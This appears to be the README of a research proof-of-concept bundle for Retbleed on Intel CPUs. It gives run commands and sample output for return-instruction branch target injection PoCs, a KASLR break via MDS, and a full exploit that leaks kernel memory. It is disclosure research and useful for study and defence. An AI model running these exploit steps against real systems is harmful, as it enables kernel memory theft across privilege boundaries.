# Retbleed --- Intel PoC

The bundle contains a full exploit under `exploits/` and minimal PoCs under
`pocs/` to show the primitives.

The code has been tested on a system with

- Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz
- Ubuntu 20.04.3 LTS
- 5.8.0-63-generic (Signed kernel image generic)

## `pocs/`
We provide two PoCs, ret_bti and cp_bti that show branch target injection
on return instructions, in the same user-space process and cross-privilege
boundaries, respectively. These PoCs only show the primitives --- they are not
full exploits and are not intended to be.

Because transparent huge pages are not always successfully created, we use one
huge page:
```
echo 1 | sudo tee /proc/sys/vm/nr_hugepages
```

## `pocs/ret_bti`
Shows branch target injection on return instructions in a user space process.
The PoC uses a reload buffer that has 16 possible slots. Upon a controlled
misprediction, we want the 10th entry to become hot. The expected results is
shown below.

```
kwikner@ee-tik-cn104:retbleed/retbleed_intel/pocs$ ./ret_bti
0 0 0 0 0 0 0 0 0 0 4224 0 0 0 0 0
```

Note: We've confirmed that it also works on Coffee Lake Refresh.

## `pocs/cp_bti`

This PoC shows that we can hijack return instructions across privilege
boundaries. We use a kernel module that executes a vulnerable return
instruction to speculatively direct the control flow to a
never-achitecturally-executed function that acts as disclosure gadget. The
kernel module is found under `/pocs/kmod_retbleed_poc/` (`make
install`). Furthermore, the user-space binary requires root to read
`/proc/self/pagemap`. Expected output:

```
kwikner@ee-tik-cn104:~/pocs$ sudo ./cp_bti
rb_pa   0x28d200000
rb_kva  0xffff9e2a0d200000
kbr_src 0xffffffffc092887b
kbr_dst 0xffffffffc0928000
0 0 0 0 0 0 0 0 0 0 31765 0 0 0 0 0
```

Note: we have not tested this carefully on Coffee Lake Refresh because enhanced
IBRS makes our method infeasible.

## `exploits/`

For Retbleed to work, the kernel image base and a physical address of a
transparent huge page is needed. We leak these using MDS over load ports. 

### `exploits/break_kaslr`
This is merely MDS, no Retbleed is involved. We're running on a 6-core machine
so we pin the process to cores 1,7. For other CPU numbering, set the `-c` flag
for `taskset` accordingly. Expected output

```
kwikner@ee-tik-cn104:retbleed_intel/exploits$ taskset -c 1,7 ./break_kaslr
[-] Break KASLR (LP-MDS)...
[*] sys_ni_syscall @ 0xffffffffa06044b0 t=2.596s
[*] kernel_text @ 0xffffffffa0600000
```

### `exploits/retbleed`

Retbleed relies on winning a race against the kernel stack, and does so by
evicting it in a sibling thread.

```
exploits$ ./retbleed -h
Usage: ./retbleed --cpu1=<value> --cpu2=<value> --kbase=<kernel_base>
                  --physmap_base=<value> [--leak_perf]
```

Sometimes Retbleed will not immediately lock on to the signal. We are not
sure about what the exact reason is. However, restarting it will eventually
result in getting a signal, hence we run it in a loop until it exits with a
without an error status:

```
/exploits$ ./do_retbleed.sh 0 0xffffffffa0600000 leak_perf
.......
[-] Leak PA of 0xd000000000 (LP-MDS)...
[*] 0x287400000 t=284ms
[*] physmap @ 0xffff9e2780000000 t=1.059
[-] Leak some bytes (Retbleed)... target=ffffffffa19a7269
3Spectre V2 : XXtpoline,amd selected but CPU is not AMD. Switching to AUTO
XXlect???????6Spectre V2 : %s selected on command line.??????3Spectre V2 :
Spectre mitigation: iernel not compiled with retpoline; no mitigation
available!??3Spectre V2 : Spectre mitigation: LFENCE not serializing, switching
to generic retpoline????????6Spectre V2 : Spectre v2 / SpectreRSB mitigation:
Filling RSB on context switch?????????6Spectre V2 : Enabling Restricted
Speculation for firmware calls??X?????6SpeXtre V2 : spectre_v2_user=%s forced on
command line.????????3Spectre V2 : Unknown user space protection option (%s).
Switching to AUTO select???????6Spectre XXX: mitigation: Egabling %s IndXXect
BranXh Prediction Barrier????????6Speculative Store Bypass: %s???4L1TF: System
has more than MAX_PA/2 memory. L1TF mitigation not effective.?????6L1TF: You may
make it effective by booting the kernel with mem=%llu parameter.?????????6L1TF:
However, doing so will makd a partXof your RAM unusable.?????????6L1TF: Re 
[*] Leaked 1000 bytes in 4.823 seconds
```

Sometimes it takes several minutes before it successfully starts to leak.
